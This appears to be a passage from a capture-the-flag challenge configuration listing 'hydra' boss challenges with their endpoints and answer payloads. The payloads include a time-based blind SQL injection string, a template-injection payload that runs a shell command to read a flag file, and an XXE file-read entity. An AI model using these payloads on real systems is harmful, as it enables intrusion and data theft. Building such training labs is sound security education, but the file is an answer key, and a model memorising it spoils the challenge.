    solution: "Send 100 concurrent POST /coupon/redeem requests"
  - id: hydra-2
    description: "Time-based blind SQLi on user search"
    endpoint: /boss/hydra/search
    solution: "' OR IF(SUBSTRING(flag,1,1)='B',SLEEP(2),0)--"
  - id: hydra-3
    description: "SSTI in feedback form"
    endpoint: /boss/hydra/feedback
    solution: "{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}"
  - id: hydra-4
    description: "XXE in XML import"
    endpoint: /boss/hydra/import
    solution: "<!ENTITY xxe SYSTEM 'file:///flag.txt'>"
  - id: hydra-5
    description: "Master token from partial flags"
    endpoint: /boss/hydra/master
    solution: "POST partial flags as JSON to /master endpoint"
